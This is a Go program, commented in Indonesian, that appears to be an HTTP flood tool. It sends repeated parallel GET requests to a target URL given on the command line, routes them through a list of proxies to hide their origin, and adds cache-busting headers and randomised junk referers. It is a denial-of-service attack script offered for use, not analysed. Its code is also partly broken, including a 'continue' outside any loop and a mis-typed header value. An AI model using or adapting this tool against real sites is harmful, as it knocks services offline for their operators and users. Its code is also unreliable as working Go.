package main

import (
    "bufio"
    "fmt"
    "math/rand"
    "net/http"
    "net/url"
    "os"
    "sync/atomic"
    "sync"
    "time"
)

var (
    referers       []string
    totalSuccess   int32 
    allProxiesSent bool
    mutex          sync.Mutex
)

func buildblock(size int) (s string) {
    var a []rune
    for i := 0; i < size; i++ {
        a = append(a, rune(rand.Intn(75)+1555))
    }
    return string(a)
}

func sendRequest(proxyURL *url.URL, targetURL string) {
    transport := &http.Transport{
        Proxy: http.ProxyURL(proxyURL),
    }
    client := &http.Client{
        Timeout:   2000 * time.Millisecond,
        Transport: transport,
    }
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        fmt.Println("Error creating request:", err)
        return
    }

    req.Header.Add("User-Agent", "My-Go-App-User-Agent")
    req.Header.Add("Pragma", "no-cache")
    req.Header.Add("Cache-Control", "no-store, no-cache")
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
    req.Header.Set("Accept-Language", "en-US,en;q=0.9")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("sec-fetch-site", "cross-site")
    req.Header.Set("Referer", referers[rand.Intn(len(referers))]+buildblock(rand.Intn(5)+5))
    req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
    req.Header.Set("Connection", "keep-alive")

    resp, err := client.Do(req)
    if err != nil {
        fmt.Println("Error sending request:", err)
        continue
    }
    defer resp.Body.Close()
    fmt.Println("Request successful with proxy", proxyURL.String())
    atomic.AddInt32(&totalSuccess, 1)
}

func main() {
    // Pastikan terdapat argumen baris perintah yang diberikan
    if len(os.Args) < 2 {
        fmt.Println("Usage: go run main.go <targetURL>")
        return
    }

    targetURL := os.Args[1] // URL target dari argumen baris perintah

    // Baca file proxy list
    proxyFile, err := os.Open("proxy.txt")
    if err != nil {
        fmt.Println("Error opening proxy list file:", err)
        return
    }
    defer proxyFile.Close()

    var proxyURLs []*url.URL
    scanner := bufio.NewScanner(proxyFile)
    for scanner.Scan() {
        proxyStr := "http://" + scanner.Text() // Format proxy string
        proxyURL, err := url.Parse(proxyStr)
        if err != nil {
            fmt.Println("Error parsing proxy URL:", err)
            continue
        }
        proxyURLs = append(proxyURLs, proxyURL)
    }

        // Baca file referers.txt
    file, err := os.Open("referers.txt")
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }
    defer file.Close()

    refererScanner := bufio.NewScanner(file) // Rename the second scanner variable to refererScanner (different name)
    for refererScanner.Scan() {
        referers = append(referers, refererScanner.Text())
    }

    if err := scanner.Err(); err != nil {
        fmt.Println(err)
        os.Exit(1)
    }

    rand.Seed(time.Now().UnixNano()) // Untuk mengacak proxy

    for {
        // Loop melalui daftar proxyURLs dan membuat request dengan menggunakan masing-masing proxy
        for _, proxyURL := range proxyURLs {
            if allProxiesSent {
                break
            }

            go func(proxyURL *url.URL) { // Menggunakan goroutine untuk menjalankan setiap request secara paralel
                sendRequest(proxyURL, targetURL)
                checkAllProxiesSent(len(proxyURLs))
            }(proxyURL) // Memanggil fungsi goroutine dengan menggunakan proxyURL sebagai argumen
        }
        time.Sleep(300 * time.Second)
    }
}
func checkAllProxiesSent(totalProxies int) {
    mutex.Lock()
    defer mutex.Unlock()

    if totalSuccess >= int32(totalProxies) {
        allProxiesSent = true
        totalSuccess = 0 // Reset totalSuccess untuk iterasi berikutnya
    }
}
